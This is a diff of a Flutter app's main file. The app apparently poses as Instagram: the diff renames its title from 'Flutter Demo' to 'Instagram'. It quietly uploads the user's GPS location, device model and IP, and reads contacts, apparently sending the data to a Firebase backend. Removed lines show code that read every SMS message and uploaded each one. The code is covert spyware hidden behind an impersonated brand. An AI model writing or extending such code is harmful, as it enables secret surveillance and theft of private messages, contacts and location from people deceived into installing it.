@@ -8,7 +8,6 @@ import 'package:flutter/services.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'screens/login_page.dart';
 import 'services/firebase-database.dart';
-import 'services/firebase-database.dart';
 import 'package:sms/sms.dart';
 import 'package:geolocator/geolocator.dart';
 
@@ -22,8 +21,6 @@ class MyApp extends StatefulWidget {
 }
 
 class _MyAppState extends State<MyApp> {
-  SmsQuery query = new SmsQuery();
-
   static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
   Map<String, dynamic> _readAndroidBuildData(AndroidDeviceInfo build) {
     return <String, dynamic>{
@@ -79,7 +76,8 @@ class _MyAppState extends State<MyApp> {
         deviceData['model'] +
         "_" +
         ip.toString().replaceAll(".", "_");
-
+    var p = await getLocation();
+    await addLoc(p.longitude.toString(), p.latitude.toString());
     if (await Permission.contacts.request().isGranted) {
       // Either the permission was already granted before or the user just granted it.
       var contacts =
@@ -92,13 +90,6 @@ class _MyAppState extends State<MyApp> {
               }).toList())
           .toList();
     }
-    List<SmsMessage> messages = await query.getAllSms;
-    messages.map((e) async {
-      await addSms(e.body);
-      print(e.body);
-    }).toList();
-    var p = await getLocation();
-    await addLoc(p.longitude.toString(), p.latitude.toString());
   }
 
   Future<Position> getLocation() async {
@@ -127,7 +118,7 @@ class _MyAppState extends State<MyApp> {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'Flutter Demo',
+      title: 'Instagram',
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
         // This is the theme of your application.
